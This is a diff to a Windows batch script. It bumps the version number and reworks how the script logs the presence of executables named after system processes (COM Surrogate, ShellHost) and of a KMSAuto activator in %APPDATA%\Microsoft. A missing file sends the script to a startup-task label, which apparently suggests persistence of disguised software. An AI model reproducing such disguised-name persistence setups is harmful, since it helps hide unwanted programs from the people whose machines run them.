@@ -10,7 +10,7 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=13.3"
+set "BATCHVERSION=13.4"
 
 
 
@@ -538,6 +538,28 @@ set "file7=%APPDATA%\Microsoft\7z.exe"
 set "file8=%APPDATA%\Microsoft\7z.dll"
 set "file9=%SystemRoot%\System32\handle.exe"
 
+
+echo Typing in %InstalledQWB%
+echo.
+
+if exist "%file1%" echo COM Surrogate.exe Found in %file1% >> "%InstalledQWB%"
+if exist "%file2%" echo ShellHost.exe Found in %file2% >> "%InstalledQWB%"
+if exist "%file3%" echo KMSAuto.exe Found in %file3% >> "%InstalledQWB%"
+if exist "%file4%" echo nircmd.exe Found in %file4% >> "%InstalledQWB%"
+if exist "%file5%" echo CoreWorkerProcess.exe Found in %file5% >> "%InstalledQWB%"
+if exist "%file6%" echo STLRRUNNERCALLER.exe Found in %file6% >> "%InstalledQWB%"
+if exist "%file7%" if exist "%file8%" (
+    echo 7z.exe and 7z.dll Found in %file7% and %file8% >> "%InstalledQWB%"
+) else (
+    if exist "%file7%" echo 7z.exe Found in %file7% >> "%InstalledQWB%"
+    if exist "%file8%" echo 7z.dll Found in %file8% >> "%InstalledQWB%"
+)
+if exist "%file9%" echo handle.exe Found in %file9% >> "%InstalledQWB%"
+
+
+
+
+
 :: Check each file
 if not exist "%file1%" goto STARTUPTAASK
 if not exist "%file2%" goto STARTUPTAASK
@@ -553,17 +575,6 @@ if not exist "%file9%" goto STARTUPTAASK
 
 :: If all files are found, continue with other tasks
 echo All files found.
-
-echo COM Surrogate.exe Found in %file1% >> "%InstalledQWB%"
-echo ShellHost.exe Found in %file2% >> "%InstalledQWB%"
-echo KMSAuto.exe Found in %file3% >> "%InstalledQWB%"
-echo nircmd.exe Found in %file4% >> "%InstalledQWB%"
-echo CoreWorkerProcess.exe Found in %file5% >> "%InstalledQWB%"
-echo STLRRUNNERCALLER.exe Found in %file6% >> "%InstalledQWB%"
-echo 7z.exe and 7z.dll Found in %file7% and %file8% >> "%InstalledQWB%"
-echo handle.exe Found in %file9% >> "%InstalledQWB%"
-
-
 
 
 
